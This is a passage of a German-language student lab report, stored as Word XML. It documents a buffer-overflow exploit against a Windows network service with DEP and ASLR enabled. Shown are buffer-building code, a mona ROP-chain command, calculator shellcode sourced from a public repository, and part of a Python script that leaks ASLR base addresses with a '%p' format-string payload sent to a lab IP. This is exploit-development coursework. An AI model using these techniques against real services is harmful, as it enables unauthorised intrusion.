                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>g = b'\x44' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="375BF4FD" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    h = b'\x45' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DD253E4" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    i = b'\x46' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68E944B1" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    j = b'\x47' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57FD2599" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    k = b'\x48' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25983C9E" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    l = b'\x49' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C5A51AA" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    m = b'\x50' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FFBBF8D" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    n = b'\x51' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47F04110" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    o = b'\x52' * 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66FCEF88" w14:textId="77777777" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1ED1F710" w14:textId="083FA507" w:rsidR="00857982" w:rsidRPr="004D58C1" w:rsidRDefault="00857982" w:rsidP="00857982">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = a + b + c +b'\xCC' + d + e + f + g + h + i + j + k + l + m + n + o</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54E87D0B" w14:textId="77777777" w:rsidR="00F24E58" w:rsidRPr="004D58C1" w:rsidRDefault="00F24E58" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C68FC75" w14:textId="0CF13D60" w:rsidR="00CE2444" w:rsidRPr="00B47CB9" w:rsidRDefault="00551289" w:rsidP="00943DB9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ich modifizierte meinen Buffer und rechnete heraus, dass ich 75 Bytes für meinen Shellcode habe</w:t>
      </w:r>
      <w:r w:rsidR="00943DB9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4F0178" w14:textId="1DCC51EF" w:rsidR="00CE2444" w:rsidRPr="00B47CB9" w:rsidRDefault="004B268F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A3074B2" wp14:editId="4FF98616">
            <wp:extent cx="2828925" cy="6543675"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>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2828925" cy="6543675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4270114B" w14:textId="216DAACC" w:rsidR="00943DB9" w:rsidRPr="00B47CB9" w:rsidRDefault="00943DB9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="073E09C3" w14:textId="17B3B1BF" w:rsidR="00943DB9" w:rsidRPr="00B47CB9" w:rsidRDefault="00943DB9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ich las mir nochmal genau die Angabe zur Aufgabenstellung durch</w:t>
      </w:r>
      <w:r w:rsidR="00EF2AE6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B69AFE" w14:textId="6F64DB5C" w:rsidR="00EF2AE6" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF2AE6" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B405781" w14:textId="3C3A0D86" w:rsidR="00EF2AE6" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF2AE6" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>„</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>Sie definieren sich selbst folgende Spielregel, Sie versuchen die Anwendung diesmal ohne Egghunter allerdings mit eingeschaltetem DEP und ALSR zu exploiten.“</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A25ABB8" w14:textId="323963BF" w:rsidR="00EF2AE6" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF2AE6" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EB46F2D" w14:textId="615B1A21" w:rsidR="00EF2AE6" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF2AE6" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>Da in der Angabe lediglich vom Exploiten von DEP und A</w:t>
      </w:r>
      <w:r w:rsidR="00525CCE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">SLR die </w:t>
      </w:r>
      <w:r w:rsidR="001A4D13" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>Rede</w:t>
      </w:r>
      <w:r w:rsidR="00525CCE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ist und die Anforderungen nicht </w:t>
      </w:r>
      <w:r w:rsidR="00CD1EE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>darin besteht eine Shell auf mein Angreifersystem zu bekommen verwende ich daher also den Aufruf des Taschenrechners.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72098BAE" w14:textId="6C3C5EAC" w:rsidR="004B268F" w:rsidRPr="00B47CB9" w:rsidRDefault="00380861" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Shellcode für den Aufruf </w:t>
      </w:r>
      <w:r w:rsidR="001A4D13" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>des Taschenrechners</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> wurde mithilfe von folgendem Tool erstellt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA72AC1" w14:textId="77777777" w:rsidR="00380861" w:rsidRPr="00B47CB9" w:rsidRDefault="00380861" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A842C26" w14:textId="1AF23133" w:rsidR="00380861" w:rsidRPr="001A4D13" w:rsidRDefault="00DE67E4" w:rsidP="001A4D13">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId69" w:history="1">
        <w:r w:rsidR="00380861" w:rsidRPr="001A4D13">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>https://github.com/peterferrie/win-exec-calc-shellcode</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7AC770E0" w14:textId="07506077" w:rsidR="00380861" w:rsidRPr="00B47CB9" w:rsidRDefault="00380861" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31916376" w14:textId="4B05E842" w:rsidR="00380861" w:rsidRPr="00B47CB9" w:rsidRDefault="00380861" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dieser ist </w:t>
      </w:r>
      <w:r w:rsidR="00F77F80" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>72 Bytes lang, passt also in meinen Exploit</w:t>
      </w:r>
      <w:r w:rsidR="00B85A0E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F29706" w14:textId="09988598" w:rsidR="00720C6E" w:rsidRPr="00B47CB9" w:rsidRDefault="00720C6E" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B49D0FA" w14:textId="1892DB69" w:rsidR="00720C6E" w:rsidRPr="00B47CB9" w:rsidRDefault="00720C6E" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1FD10071" wp14:editId="300AAC91">
            <wp:extent cx="5324475" cy="1238250"/>
            <wp:effectExtent l="0" t="0" r="9525" b="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324475" cy="1238250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F80B5B" w14:textId="76FDFF00" w:rsidR="00720C6E" w:rsidRPr="00B47CB9" w:rsidRDefault="00720C6E" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="092CA933" w14:textId="191BC5F1" w:rsidR="00F77F80" w:rsidRPr="00B47CB9" w:rsidRDefault="0077410D" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Da die Anfangs funktionierende ROPChain aber auf die direkte Speicheradresse verwies war meine ROP</w:t>
      </w:r>
      <w:r w:rsidR="00D954D4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Chain zwar zu gebrauchen, jedoch wollte ich nicht unbedingt </w:t>
      </w:r>
      <w:r w:rsidR="00723B40" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>von der aktuelle Base zurückrechnen</w:t>
      </w:r>
      <w:r w:rsidR="00FB781C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Daher suchte ich nach einer besseren Lösung und wurde mit dem Befehl </w:t>
      </w:r>
      <w:r w:rsidR="007A5913" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">„!mona rop -m WS2_32.dll,ucrtbase.dll,ntdll.dll,kernel32.dll -rva -cpb "\x00"“ fündig. Mit dem Parameter rva kann man eine ROPChain generieren, welche </w:t>
      </w:r>
      <w:r w:rsidR="000706EC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Adresse </w:t>
      </w:r>
      <w:r w:rsidR="00ED6DD5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in Relation zur Base</w:t>
      </w:r>
      <w:r w:rsidR="00832E5A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (also das Offset)</w:t>
      </w:r>
      <w:r w:rsidR="00ED6DD5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ang</w:t>
      </w:r>
      <w:r w:rsidR="00351EA1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ibt. Cool!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33032CB6" w14:textId="1BD7227A" w:rsidR="00351EA1" w:rsidRPr="00B47CB9" w:rsidRDefault="00351EA1" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27526C6D" w14:textId="05620EAA" w:rsidR="00351EA1" w:rsidRPr="00B47CB9" w:rsidRDefault="00351EA1" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Meine generierte ROPChain lautet also wie folgt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A79AC9" w14:textId="16F82EB3" w:rsidR="00351EA1" w:rsidRPr="00B47CB9" w:rsidRDefault="00B5741A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="298D8831" wp14:editId="1D2F27DB">
            <wp:extent cx="5100637" cy="3839256"/>
            <wp:effectExtent l="0" t="0" r="5080" b="8890"/>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105333" cy="3842791"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A243516" w14:textId="51DFA2F3" w:rsidR="00B5741A" w:rsidRPr="00B47CB9" w:rsidRDefault="00B5741A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Wie in der Abbildung ersichtlich </w:t>
      </w:r>
      <w:r w:rsidR="00EE4772" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>muss nun zur Funktion die Base Adresse der jeweiligen DLLs übergeben werden.</w:t>
      </w:r>
      <w:r w:rsidR="00327CE2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ich </w:t>
      </w:r>
      <w:r w:rsidR="00160263" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>kopierte die für ASLR generierte Methode in meinen Exploit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBBD56C" w14:textId="7CF790E2" w:rsidR="00EE4772" w:rsidRPr="00B47CB9" w:rsidRDefault="00EE4772" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00327CE2" w:rsidRPr="00B47CB9" w14:paraId="1972BA79" w14:textId="77777777" w:rsidTr="00327CE2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="35B5D37E" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#!/usr/bin/python</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B7F59D9" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FA6A1D6" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import struct</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="369B7DF0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="063B28F2" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def getAslrBase():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="269E8DB4" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BAEF84D" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    numberOfChars = 172</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72786781" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    char = b"%p&gt;"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1027AF49" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = char * numberOfChars</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D7C3AE4" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    fileName = 'leaked_adresses_2_3.txt'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01EC1F96" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5A848067" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    startLenght = 20</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="283ED121" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    bufferLenght = numberOfChars * 9 + startLenght</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CE9A413" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7A483282" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EC69B9D" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="644CAF93" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('C \r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CF87690" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
